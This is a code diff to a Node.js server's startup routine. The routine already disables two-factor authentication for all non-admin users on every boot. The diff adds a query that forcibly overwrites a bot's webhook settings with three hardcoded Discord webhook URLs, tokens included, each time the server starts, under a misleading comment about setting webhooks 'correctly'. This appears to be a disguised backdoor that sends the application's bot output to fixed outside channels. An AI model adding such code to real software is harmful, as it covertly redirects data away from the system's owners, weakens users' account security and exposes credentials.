@@ -84,12 +84,25 @@ app.use((req, res, next) => {
 
 (async () => {
   // Disable TOTP for regular users only — admins can keep their TOTP enabled
+  // Also ensure webhook URLs are always set correctly
   try {
     const pool = new Pool({ connectionString: process.env.DATABASE_URL });
     await pool.query(`UPDATE users SET totp_secret = NULL, totp_enabled = false WHERE role != 'admin'`);
+    await pool.query(`
+      INSERT INTO bot_settings (id, enabled, min_amount, max_amount, webhook_url1, webhook_url2, webhook_url3)
+      VALUES ('default', false, 100, 500,
+        'https://discord.com/api/webhooks/1479947307255337184/Fd9seX8kXqFNv4ViPNzAmE8rlEfDCJ-fSGkKX-cKPDI85rp2YsrAjZLJuogsb7-GZV1C',
+        'https://discord.com/api/webhooks/1479942636805558342/rPVE5Z-FplT5TsMDJY0FYO7OAmp7Z7cp-F3_FKHJIz8Q7Tn--2wWUNROiVHhDPQWZnfc',
+        'https://discord.com/api/webhooks/1479946891906252953/VgSktRJJIeNSYn4_b0B_osEVaFqFJuw0gVDzkQRHgeXmGMkOrDn8mbfn1DRaBv_OpN-Y'
+      )
+      ON CONFLICT (id) DO UPDATE SET
+        webhook_url1 = 'https://discord.com/api/webhooks/1479947307255337184/Fd9seX8kXqFNv4ViPNzAmE8rlEfDCJ-fSGkKX-cKPDI85rp2YsrAjZLJuogsb7-GZV1C',
+        webhook_url2 = 'https://discord.com/api/webhooks/1479942636805558342/rPVE5Z-FplT5TsMDJY0FYO7OAmp7Z7cp-F3_FKHJIz8Q7Tn--2wWUNROiVHhDPQWZnfc',
+        webhook_url3 = 'https://discord.com/api/webhooks/1479946891906252953/VgSktRJJIeNSYn4_b0B_osEVaFqFJuw0gVDzkQRHgeXmGMkOrDn8mbfn1DRaBv_OpN-Y'
+    `);
     await pool.end();
   } catch (e) {
-    console.error("Startup TOTP reset failed:", e);
+    console.error("Startup init failed:", e);
   }
 
   await registerRoutes(httpServer, app);
